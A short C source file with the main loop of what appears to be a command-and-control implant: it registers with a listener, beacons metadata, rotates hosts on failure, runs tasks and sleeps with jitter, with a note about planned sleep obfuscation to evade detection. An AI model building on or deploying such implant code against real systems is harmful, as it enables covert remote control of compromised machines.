#include "agent.h"
#include "package.h"
#include "TaskController.h"
#include "ListManager.h"

pAgent agent = { 0 };

void AgentMain() {
	
	INT err;
	Agent Agent = { 0 };
	agent = &Agent;
	

	if ((err = init_agent()) != 0) {
		printf("[error] attempting to initialize agent\n");
		return -1;
	}

	
	if ((err = RegisterAgent()) != 0) {
		printf("[error] attempting to register agent\n");
		return -1;
	}

	AgentRoutine();

}

void AgentRoutine() {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig->CurrentHost->NumFailures++;
				if (agent->config->listenerConfig->CurrentHost->NumFailures >= MAX_HOST_FAILURES)
				{
					agent->config->listenerConfig->CurrentHost->NumFailures = 0;
					SelectHost(HOST_ROTATION_FAIL_OVER);
				}
			}
			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {
			TaskingRoutine();
		}

		// Sleep for a while before checking in again. - TODO implement encrypted sleep obfuscation.
		Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
	}
}